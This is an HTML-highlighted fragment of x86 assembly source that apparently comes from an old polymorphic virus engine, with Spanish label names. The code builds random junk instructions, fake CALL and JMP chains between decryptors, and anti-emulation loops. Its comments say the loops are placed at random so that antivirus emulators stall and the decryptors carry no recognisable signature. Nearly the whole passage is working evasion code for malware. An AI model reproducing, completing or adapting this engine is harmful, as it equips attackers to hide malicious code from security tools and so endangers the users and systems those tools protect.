        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">          </span><span class="sc1">; Construct a 8/16 bits opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">                 </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">             </span><span class="sc1">; Aleatory zero flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@CallAleatorio</span><span class="sc0">         </span><span class="sc1">; If zero flag, construct a CALL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">            </span><span class="sc1">; Save AL on BL</span><span class="sc0">
     </span><span class="sc5">@@KKKKSK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">         </span><span class="sc1">; Get an aleatory number between</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0007h</span><span class="sc0">         </span><span class="sc1">; 1 and 7</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@KKKKSK</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">          </span><span class="sc1">; If 16 bit jump, store word</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salhhh</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">                 </span><span class="sc1">; If 8 bit jump, store byte</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Saliii</span><span class="sc0">
      </span><span class="sc5">@@Salhhh</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSW</span><span class="sc0">
      </span><span class="sc5">@@Saliii</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">            </span><span class="sc1">; Put displacement in CX</span><span class="sc0">
      </span><span class="sc5">@@Saljjj</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">         </span><span class="sc1">; Insert CX random bytes</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@Saljjj</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">               </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">;; Construct a random CALL</span><span class="sc0">
</span><span class="sc5">@@CallAleatorio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NumeroCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Check if a CALL was</span><span class="sc0">
                        </span><span class="sc1">; constructed before</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@MMDKKC</span><span class="sc0">          </span><span class="sc1">; If not, jump and continue</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiPrimerDes</span><span class="sc0">     </span><span class="sc1">; Check if it is the second de-</span><span class="sc0">
                        </span><span class="sc1">; cryptor (in order of execu-</span><span class="sc0">
                        </span><span class="sc1">; tion)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SaltaSigue</span><span class="sc0">      </span><span class="sc1">; If it is, jump and continue</span><span class="sc0">
          </span><span class="sc1">; Here if it is the first decryptor</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoopYaEsta</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Was performed the de-</span><span class="sc0">
                              </span><span class="sc1">; cryption LOOP?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@MMDKKC</span><span class="sc0">          </span><span class="sc1">; If not, jump</span><span class="sc0">
</span><span class="sc1">; Here to use a constructed CALL. They could be inter-decryptor CALLs.</span><span class="sc0">
  </span><span class="sc5">@@SaltaSigue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">; Save AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get Zero Flag with 1/4 of probability</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@MMDKKC</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">         </span><span class="sc1">; Eliminate JMP opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">       </span><span class="sc1">; Put CALL opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Save after-CALL address in CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Save BX</span><span class="sc0">
  </span><span class="sc5">@@MMDKKC2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0007h</span><span class="sc0">      </span><span class="sc1">; Get a random AX between 0 and 7</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NumeroCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if it is greater than</span><span class="sc0">
                           </span><span class="sc1">;the number of constructed CALLs</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">   </span><span class="sc5">@@MMDKKC2</span><span class="sc0">        </span><span class="sc1">; If it overpasses it or it's equal,</span><span class="sc0">
                       </span><span class="sc1">; get another number</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Multiply number by two</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Get address of constructed CALL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">DirecCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get CALL address in AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">         </span><span class="sc1">; Get displacement in AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store CALL displacement</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Restore BX and return</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">;; Here to generate a random CALL</span><span class="sc0">
  </span><span class="sc5">@@MMDKKC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">         </span><span class="sc1">; Save DI</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">        </span><span class="sc1">; Check if JMP 8 bits or JMP 16 bits</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salccc</span><span class="sc0">         </span><span class="sc1">; Jump if 8 bits</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">              </span><span class="sc1">; Store a byte with value 0</span><span class="sc0">
     </span><span class="sc5">@@Salccc</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">              </span><span class="sc1">;   "   "  "    "     "   "</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NumeroCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc1">; Check if the number</span><span class="sc0">
                            </span><span class="sc1">; of constructed CALLs is 8</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez32</span><span class="sc0">      </span><span class="sc1">;If there are 8 constructed CALLs, jump</span><span class="sc0">
                       </span><span class="sc1">; and don't store its address</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NumeroCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increase number of CALLs</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Save BX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc0">         </span><span class="sc1">; Get the address where the address of</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NumeroCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; this CALL will be</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; stored...</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">DirecCALLs</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; ...and store it.</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">         </span><span class="sc1">; Restore BX</span><span class="sc0">
   </span><span class="sc5">@@OtraVez32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get a random AX between 1 and 3</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0003</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez32</span><span class="sc0">
     </span><span class="sc5">@@Loopccc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Save AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria2</span><span class="sc0"> </span><span class="sc1">; Generate a random instruction.</span><span class="sc0">
                </span><span class="sc1">; "I'm inside" flag is set, so a CALL can't be</span><span class="sc0">
                </span><span class="sc1">; generated</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Restore AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Repeat AX times</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Loopccc</span><span class="sc0">
     </span><span class="sc5">@@Salddd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0"> </span><span class="sc1">; Insert a "RET"</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">  </span><span class="sc1">; Restore saved DI in SI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Load in AX the address where the displa-</span><span class="sc0">
                    </span><span class="sc1">; cement will be stored</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0"> </span><span class="sc1">;Check if it is a JMP of 16 bits</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">           </span><span class="sc1">; Save flags</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Saleee</span><span class="sc0">      </span><span class="sc1">; If it is, jump</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Decrement AX to get the address for JMPs</span><span class="sc0">
                    </span><span class="sc1">; of 8 bits</span><span class="sc0">
     </span><span class="sc5">@@Saleee</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">      </span><span class="sc1">; Get in CX the JMP displacement</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">            </span><span class="sc1">; Restore flags</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salfff</span><span class="sc0">      </span><span class="sc1">; If it is a JMP of 16 bits, jump</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">    </span><span class="sc1">; Save 8 bits displacement</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salggg</span><span class="sc0">      </span><span class="sc1">; Continue</span><span class="sc0">
     </span><span class="sc5">@@Salfff</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">    </span><span class="sc1">; Save 16 bits displacement</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
     </span><span class="sc5">@@Salggg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Increase SI by 1 or 2 (depending on)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">    </span><span class="sc1">; Store CALL opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">      </span><span class="sc1">; Calculate address of calling</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">HazBasuraAleatoria2</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to insert a basic anti-emulating trick</span><span class="sc0">
</span><span class="sc5">AntiEmulating</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">  </span><span class="sc1">; Get a Zero Flag with a 1/8 of probability</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc0">     </span><span class="sc1">;If Zero Flag, return. This is made to avoid</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Retorna</span><span class="sc0">    </span><span class="sc1">; putting an anti-emulating routine always,</span><span class="sc0">
                   </span><span class="sc1">; and forcing to not have a "mark" of this</span><span class="sc0">
                   </span><span class="sc1">; engine in its decryptors.</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">     </span><span class="sc1">; Get a random 0 or 1</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntiEmulacion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if this number of rou-</span><span class="sc0">
                         </span><span class="sc1">; tine was constructed before</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">AntiEmulating</span><span class="sc0">   </span><span class="sc1">; If it was, get another random number</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AntiEmulacion</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">;Put this number in this field</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">     </span><span class="sc1">; If AL=0, goto trick number 0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Truco03</span><span class="sc0">
</span><span class="sc1">;; This routine constructs an anti-emulating portion of code. This generates</span><span class="sc0">
</span><span class="sc1">;; a big LOOP that it is executed in miliseconds, but takes a lot of time with</span><span class="sc0">
</span><span class="sc1">;; emulation (counter register has a big value). This forces to emulators to</span><span class="sc0">
</span><span class="sc1">;; "think" that it's an endless LOOP here.</span><span class="sc0">
  </span><span class="sc5">@@Truco02</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Get an usable-for-garbage register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenRegistro</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Put it on DL</span><span class="sc0">
  </span><span class="sc5">@@OtraVez01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random number between 2000h and</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">       </span><span class="sc1">; 7FFFh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@OtraVez01</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Saslld</span><span class="sc0">        </span><span class="sc1">; Construct a MOV with the register DL</span><span class="sc0">
                      </span><span class="sc1">; and the value CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">        </span><span class="sc1">; Get address where the LOOP begins in DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">        </span><span class="sc1">; Put a PUSH Selected-Register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtroPUSH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0FFh</span><span class="sc0">    </span><span class="sc1">; Word-opcode PUSH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Continue01</span><span class="sc0">
    </span><span class="sc5">@@OtroPUSH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">       </span><span class="sc1">; Byte-opcode PUSH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
  </span><span class="sc5">@@Continue01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">        </span><span class="sc1">; Save DX, CX and SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Construct a random set of instruc-</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">         </span><span class="sc1">; tions</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">        </span><span class="sc1">; Restore DX, CX and SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">        </span><span class="sc1">; Put a POP Selected-Register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@OtroPOP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C08Fh</span><span class="sc0">     </span><span class="sc1">; Word-opcode POP</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Continue02</span><span class="sc0">
    </span><span class="sc5">@@OtroPOP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">       </span><span class="sc1">; Byte-opcode POP</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
  </span><span class="sc5">@@Continue02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtroDEC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">       </span><span class="sc1">; Put a "DEC Selected-Register"</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Continue04</span><span class="sc0">
    </span><span class="sc5">@@OtroDEC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8FFh</span><span class="sc0">    </span><span class="sc1">; Word-opcode DEC</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">@@Continue04</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraSinBanderas</span><span class="sc0"> </span><span class="sc1">;Construct instructions that don't</span><span class="sc0">
                         </span><span class="sc1">; modify checking flags</span><span class="sc0">
